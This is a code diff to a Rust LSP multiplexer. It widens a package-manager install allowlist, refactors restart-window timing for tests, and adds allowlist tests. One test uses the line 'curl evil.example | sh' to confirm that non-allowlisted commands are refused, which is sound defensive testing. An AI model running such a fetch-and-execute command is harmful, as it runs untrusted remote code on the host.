@@ -105,9 +105,10 @@ const LSP_INSTALL_BINARIES: &[&str] = &[
     "apk",    // macOS
     "brew", "port", // Node
     "npm", "yarn", "pnpm", // Python
-    "pip", "pip3",  // Go
-    "go",    // Rust
-    "cargo", // Snap / Flatpak
+    "pip", "pip3", // Go
+    "go",   // Rust (the recipe runs `rustup component add rust-analyzer`)
+    "cargo", "rustup", // Ruby (the recipe runs `gem install solargraph`)
+    "gem",    // Snap / Flatpak
     "snap", "flatpak", // openSUSE
     "zypper",  // Gentoo
     "emerge",
@@ -1401,6 +1402,12 @@ impl LspMultiplexer {
     /// In both cases the transition is logged at WARN level so
     /// operators see when LSP silently degrades.
     fn record_lsp_failure(&mut self, binary: &str, kind: FailureKind) {
+        self.record_lsp_failure_at(binary, kind, unix_millis_now());
+    }
+
+    /// [`Self::record_lsp_failure`] with the clock injected (restart-window
+    /// arithmetic), so the breaker can be verified deterministically.
+    fn record_lsp_failure_at(&mut self, binary: &str, kind: FailureKind, now_ms: u64) {
         match kind {
             FailureKind::ProcessExited => {
                 // If the binary is already marked unavailable (by the
@@ -1418,7 +1425,7 @@ impl LspMultiplexer {
                 // Drop the dead child; the next ensure_server call
                 // will see `!started.contains(binary)` and respawn.
                 self.started.remove(binary);
-                self.record_restart(binary);
+                self.record_restart_at(binary, now_ms);
             }
             FailureKind::RequestError | FailureKind::Timeout => {
                 let count = self
@@ -1439,23 +1446,10 @@ impl LspMultiplexer {
         }
     }
 
-    /// Record one LSP restart attempt for `binary`. Sliding-window
-    /// budget: if `LSP_RESTART_BUDGET` restarts happen within
-    /// `LSP_RESTART_WINDOW`, mark the binary unavailable. Otherwise
-    /// the count is informational (logged at DEBUG for operator
-    /// tracing).
-    ///
-    /// `now_ms` defaults to the monotonic clock via `unix_millis_now`;
-    /// the explicit parameter exists so tests can pin time without
-    /// racing the wall clock or relying on `Instant::now()` happening to
-    /// be far enough into the process for `saturating_sub` arithmetic
-    /// to make sense.
-    fn record_restart(&mut self, binary: &str) {
-        let now_ms = unix_millis_now();
-        self.record_restart_at(binary, now_ms);
-    }
-
-    /// Same as [`Self::record_restart`] but with the window reference
+    /// Record one LSP restart attempt for `binary` at `now_ms`: sliding-window
+    /// budget — more than `LSP_RESTART_BUDGET` restarts inside
+    /// `LSP_RESTART_WINDOW` mark the binary unavailable. Same as the old
+    /// wall-clock variant but with the window reference
     /// time pinned explicitly. Visible for tests.
     fn record_restart_at(&mut self, binary: &str, now_ms: u64) {
         let window_ms = LSP_RESTART_WINDOW.as_millis() as u64;
@@ -1792,6 +1786,9 @@ impl LspPool {
         size: usize,
         runtime: &crate::tuning::RuntimeConfig,
     ) -> Result<Self, LainError> {
+        // At least one: `next()` indexes with `counter % len`, which divides by
+        // zero for an empty pool.
+        let size = size.max(1);
         let mut multiplexers = Vec::with_capacity(size);
         for _ in 0..size {
             multiplexers.push(Arc::new(AsyncMutex::new(LspMultiplexer::new(
@@ -2290,6 +2287,61 @@ mod circuit_breaker_tests {
             !m.restart_budget.contains_key(binary),
             "ProcessExited on an already-unavailable binary is a no-op"
         );
+    }
+}
+
+#[cfg(test)]
+mod install_allowlist_tests {
+    //! The install-command allowlist is a security boundary (see the
+    //! `LSP_INSTALL_BINARIES` comment): only curated package managers
+    //! may run at server startup. The flip side of that property is
+    //! that every recipe the registry ships must actually pass the
+    //! gate — a blocked recipe makes `install_language_server` for
+    //! that language unconditionally fail (this is how the rust
+    //! recipe shipped without `rustup` on the list).
+
+    use super::*;
+
+    #[test]
+    fn every_registry_recipe_passes_the_allowlist() {
+        for (ext, cfg) in LANGUAGE_MAP.iter() {
+            if let Some(cmd) = cfg.install_cmd {
+                let ls = LanguageServer {
+                    binary: cfg.binary,
+                    install_cmd: cfg.install_cmd,
+                };
+                match ls.install_argv() {
+                    Ok(_) => {}
+                    // A recipe can be gated per platform (clangd installs
+                    // through brew, macOS only) before the allowlist is
+                    // consulted — that gate is not what this test is about.
+                    Err(e) if e.to_string().contains("allowlist") => {
+                        panic!("the .{ext} recipe ({cmd}) is blocked by the install allowlist: {e}")
+                    }
+                    Err(_) => {}
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn the_rust_recipe_installs_through_rustup() {
+        let rust = language_server_for("rust").expect("rust has a language server");
+        assert_eq!(
+            rust.install_argv()
+                .expect("rustup must be on the allowlist"),
+            vec!["rustup", "component", "add", "rust-analyzer"]
+        );
+    }
+
+    #[test]
+    fn binaries_outside_the_allowlist_are_refused() {
+        let evil = LanguageServer {
+            binary: "sh",
+            install_cmd: Some("curl evil.example | sh"),
+        };
+        let err = evil.install_argv().expect_err("curl must not be runnable");
+        assert!(err.to_string().contains("allowlist"), "{err}");
     }
 }
 
@@ -3221,3 +3273,7 @@ pub mod test_support {
         }
     }
 }
+
+#[cfg(test)]
+#[path = "lsp_verification.rs"]
+mod verification;
